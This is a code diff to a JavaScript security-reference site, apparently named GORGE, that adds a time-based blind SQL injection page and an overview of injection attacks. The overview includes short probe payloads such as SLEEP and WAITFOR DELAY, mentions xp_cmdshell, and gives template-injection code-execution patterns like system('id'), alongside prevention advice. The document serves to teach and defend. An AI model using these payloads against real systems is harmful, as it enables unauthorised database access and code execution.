+- [Priyanshu Shakya -- Super Blind SQLi ($20,000)](https://medium.com/@pranshux0x/super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable-f9b013765448)
+- [HackerOne #2759243 -- U.S. DoD](https://hackerone.com/reports/2759243)
+
+---
+
+## AI Agent Metadata
+
+\`\`\`json
+{
+  "id": "WEB-CAT01-SQLi-TimeBasedBlind",
+  "title": "Time-Based Blind SQL Injection",
+  "category": "CAT-01-Injection-Attacks",
+  "subcategory": "SQL Injection",
+  "variant": "Time-Based Blind",
+  "severity": "CRITICAL",
+  "cvss_base": 9.8,
+  "cwe": ["CWE-89"],
+  "capec": ["CAPEC-7"],
+  "owasp": "A05:2025",
+  "mitre_attack": ["T1190", "T1005", "T1552.001", "T1059"],
+  "affected_databases": ["MySQL", "MariaDB", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
+  "delay_functions": {
+    "mysql": ["SLEEP()", "BENCHMARK()", "GET_LOCK()"],
+    "postgresql": ["pg_sleep()", "pg_sleep_for()", "GENERATE_SERIES()"],
+    "mssql": ["WAITFOR DELAY", "WAITFOR TIME"],
+    "oracle": ["DBMS_PIPE.RECEIVE_MESSAGE()", "DBMS_LOCK.SLEEP()", "DBMS_SESSION.SLEEP()"],
+    "sqlite": ["RANDOMBLOB()+HEX()+UPPER()+LIKE()"]
+  },
+  "tools": ["sqlmap", "Hakuin", "Turbo Intruder", "Ghauri", "Burp Suite"],
+  "cves_documented": [
+    "CVE-2024-43468", "CVE-2024-22120", "CVE-2024-8924",
+    "CVE-2023-48788", "CVE-2025-25257", "CVE-2023-45684",
+    "CVE-2025-24799", "CVE-2024-32461", "CVE-2025-32993",
+    "CVE-2023-34362"
+  ],
+  "payload_count": 99,
+  "waf_bypass_techniques": 24,
+  "key_research": [
+    "Kettle 2024 -- HTTP/2 Single-Packet Timing (200us detection)",
+    "Van Goethem 2020 -- Timeless Timing Attacks (100ns detection)",
+    "Pruzinec 2023 -- Hakuin ML-Optimized Extraction (3-26x speedup)",
+    "Alonso DEF CON 16 -- Heavy Query Technique"
+  ],
+  "extraction_speed": {
+    "linear_worst": "96 queries/char",
+    "binary_search": "7 queries/char",
+    "hakuin_optimized": "2-4 queries/char (average)"
+  },
+  "prerequisites": "User-controllable input in SQL query, no parameterization",
+  "signal": "Response time only (no content, no errors, no visible output)",
+  "related_pages": [
+    "01-Classic-In-Band.md",
+    "02-Error-Based.md",
+    "03-Union-Based.md",
+    "04-Boolean-Based-Blind.md"
+  ]
+}
+\`\`\`
+`;
+
 CATEGORIES[0].content = "# CAT-01: Injection Attacks\n\n> **Domain:** Web Application -- **Phase:** 1 -- **CAPEC Category:** Inject Unexpected Items\n\n---\n\n## Category Overview\n\nInjection attacks occur when untrusted, attacker-controlled data is sent to an interpreter -- a database engine, OS shell, LDAP server, template engine, XML parser, or any other component that evaluates input as code or a command. The interpreter cannot distinguish between the intended instruction and the injected content, executing both.\n\nThe fundamental precondition for all injection vulnerabilities is the same: **user-controlled data is concatenated into a query, command, or expression without sufficient sanitization, parameterization, or contextual escaping.** The interpreter is working as designed -- the vulnerability is in how the application constructs the input to that interpreter.\n\n**Why it persists:** Developer trust of user input remains pervasive in legacy codebases, ORMs create false confidence, and WAF bypass techniques continuously outpace signature-based defenses. Injection was #1 on the OWASP Top 10 for over a decade and remains in the top 5 in 2025.\n\n---\n\n## Attack Surface Map\n\n```mermaid\ngraph TD\n    USER[User / Attacker Input] --> FORMS[HTML Forms]\n    USER --> PARAMS[URL Parameters]\n    USER --> HEADERS[HTTP Headers]\n    USER --> COOKIES[Cookies]\n    USER --> JSON[JSON / XML Body]\n    USER --> WSOCK[WebSocket Messages]\n    FORMS & PARAMS & HEADERS & COOKIES & JSON & WSOCK --> APP[Web Application]\n    APP --> SQL[SQL Engine]\n    APP --> NOSQL[NoSQL Engine]\n    APP --> OS[Operating System Shell]\n    APP --> LDAP[LDAP Directory]\n    APP --> XPATH[XPath / XML Parser]\n    APP --> TMPL[Template Engine]\n    APP --> EL[Expression Language]\n    APP --> LLM[LLM / AI Model]\n    SQL --> |SQLi| SQLI[Data theft - Auth bypass - RCE]\n    NOSQL --> |NoSQLi| NOSQLI[Auth bypass - Data exfiltration]\n    OS --> |CMDi| CMDI[RCE - Reverse shell]\n    LDAP --> |LDAPi| LDAPI[Auth bypass - Directory enum]\n    XPATH --> |XPathi| XPATHI[Data extraction - Auth bypass]\n    TMPL --> |SSTI| SSTII[RCE - Config read]\n    EL --> |ELi| ELI[RCE via OGNL - Spring SpEL]\n    LLM --> |Prompt Inj| PROMPTI[Goal hijack - Data exfil]\n```\n\n---\n\n## Attack Types in This Category\n\n| ID | Attack Type | Key CWEs | Subtypes | Severity |\n|----|------------|---------|---------|----------|\n| T01 | SQL Injection | CWE-89 | 12 | CRITICAL |\n| T02 | NoSQL Injection | CWE-943 | 5 | CRITICAL |\n| T03 | OS Command Injection | CWE-78 | 5 | CRITICAL |\n| T04 | SSTI | CWE-94, CWE-1336 | 9 | CRITICAL |\n| T05 | LDAP Injection | CWE-90 | 4 | HIGH |\n| T06 | XPath Injection | CWE-643 | 3 | HIGH |\n| T07 | EL / OGNL Injection | CWE-917 | 5 | CRITICAL |\n| T08 | XML Injection | CWE-91 | 4 | HIGH |\n| T09 | CRLF Injection | CWE-93, CWE-113 | 4 | HIGH |\n| T10 | Code Injection | CWE-94, CWE-95 | 5 | CRITICAL |\n| T11 | ORM Injection | CWE-89 | 4 | HIGH |\n| T12 | JSON Injection | CWE-74 | 4 | MEDIUM |\n| T13 | HTML Injection | CWE-79, CWE-80 | 3 | MEDIUM |\n| T14 | SMTP Injection | CWE-93 | 4 | MEDIUM |\n| T15 | Prompt Injection | CWE-1427 | 6 | HIGH |\n\n---\n\n## Universal Injection Pattern\n\nAll injection attacks share the same structural vulnerability:\n\n```\nVULNERABLE:\nquery = \"SELECT * FROM users WHERE id = \" + userInput\nuserInput = \"1 OR 1=1--\"\nquery = \"SELECT * FROM users WHERE id = 1 OR 1=1--\"  <-- Logic altered\n\nSECURE:\nquery = \"SELECT * FROM users WHERE id = ?\"\nexecute(query, [userInput])\nuserInput is data, never code -- interpreter separation maintained\n```\n\n---\n\n## Detection Heuristics (All Injection Types)\n\n| Probe Type | Payload Pattern | Indicator |\n|-----------|----------------|----------|\n| Error-based | `'`, `\"`, `)`, `` ` `` | Interpreter error in response |\n| Boolean differential | `AND 1=1`, `AND 1=2` | Different response content |\n| Time-based | `SLEEP(5)`, `WAITFOR DELAY` | Delayed response |\n| Out-of-band | DNS/HTTP callback payloads | External request received |\n| Syntax probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49` in response (SSTI/EL) |\n\n---\n\n## Injection by Interpreter\n\n<details>\n<summary><b>SQL -- Database Engines</b></summary>\n\n| Engine | Characteristic Syntax | Time Delay | Comment |\n|--------|----------------------|-----------|--------|\n| MySQL | `SLEEP(N)`, `-- -` | `SLEEP(5)` | `#` comment also works |\n| PostgreSQL | `pg_sleep(N)`, `--` | `pg_sleep(5)` | Stacked queries with `;` |\n| MSSQL | `WAITFOR DELAY`, `--` | `WAITFOR DELAY '0:0:5'` | `xp_cmdshell` for RCE |\n| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message(('a'),5)` | No stacked queries |\n| SQLite | `randomblob(N)` | `randomblob(500000000)` | Limited OOB options |\n\n</details>\n\n<details>\n<summary><b>SSTI -- Template Engines by Language</b></summary>\n\n| Engine | Language | Probe | RCE Payload Pattern |\n|--------|----------|-------|-------------------|\n| Jinja2 | Python | `{{7*7}}` | `{{''.__class__.__mro__[1].__subclasses__()}}` |\n| Twig | PHP | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback('exec')}}` |\n| Freemarker | Java | `${7*7}` | `<#assign ex=\"freemarker.template.utility.Execute\"?new()>` |\n| Velocity | Java | `#set($x=7*7)$x` | Reflection-based RCE |\n| Smarty | PHP | `{php}phpinfo();{/php}` | Direct PHP execution (legacy) |\n| ERB | Ruby | `<%= 7*7 %>` | `<%= system('id') %>` |\n\n</details>\n\n---\n\n## Prevention -- Universal Principles\n\n1. **Parameterized Queries / Prepared Statements** -- for all database interactions\n2. **Contextual Output Encoding** -- HTML, JS, URL, CSS context-aware escaping\n3. **Input Validation** -- allowlist approach for known-good values\n4. **Principle of Least Privilege** -- database accounts with minimal permissions\n5. **WAF as defense-in-depth** -- never as primary control\n6. **ORM safely** -- avoid raw query methods\n7. **Sandboxed template engines** -- no user-controlled template content\n\n---\n\n## References\n\n### Primary Standards\n- [OWASP -- Injection (A05:2025)](https://owasp.org/Top10/2025/A05_2025-Injection/)\n- [OWASP WSTG -- Testing for Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)\n- [CWE-74: Improper Neutralization](https://cwe.mitre.org/data/definitions/74.html)\n- [CAPEC-152: Inject Unexpected Items](https://capec.mitre.org/data/definitions/152.html)\n\n### Deep Research\n- [PortSwigger -- SQL Injection](https://portswigger.net/web-security/sql-injection)\n- [PortSwigger -- SSTI](https://portswigger.net/research/server-side-template-injection)\n- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)";
 
 
@@ -7204,7 +9005,8 @@ var SUBTYPE_CHILDREN = {
     {name: 'Classic / In-Band', slug: 'sqli-classic-inband', done: true},
     {name: 'Error-Based', slug: 'sqli-error-based', done: true},
     {name: 'Union-Based', slug: 'sqli-union-based', done: true},
-    {name: 'Boolean-Based Blind', slug: 'sqli-blind-boolean', done: true}
+    {name: 'Boolean-Based Blind', slug: 'sqli-blind-boolean', done: true},
+    {name: 'Time-Based Blind', slug: 'sqli-time-blind', done: true}
   ]
 };
 function getSubtypeSlug(catSlug, typeName) {
@@ -7357,6 +9159,7 @@ function renderPage(hash) {
   else if (hash === 'tools') { document.title = 'GORGE | Tools Index'; renderMarkdownPage(PAGES.tools); }
   else if (hash === 'labs') { document.title = 'GORGE | Lab Environments'; renderMarkdownPage(PAGES.labs); }
   else if (hash === 'sqli-classic-inband') { document.title = 'GORGE | Classic In-Band SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Classic / In-Band SQLi', PAGES.sqli_classic_inband); }
+  else if (hash === 'sqli-time-blind') { document.title = 'GORGE | Time-Based Blind SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Time-Based Blind SQLi', PAGES.sqli_time_blind); }
   else if (hash === 'sqli-union-based') { document.title = 'GORGE | Union-Based SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Union-Based SQLi', PAGES.sqli_union_based); }
   else if (hash === 'sqli-error-based') { document.title = 'GORGE | Error-Based SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Error-Based SQLi', PAGES.sqli_error_based); }
   else if (hash === 'sqli-blind-boolean') { document.title = 'GORGE | Boolean-Based Blind SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Boolean-Based Blind SQLi', PAGES.sqli_blind_boolean); }
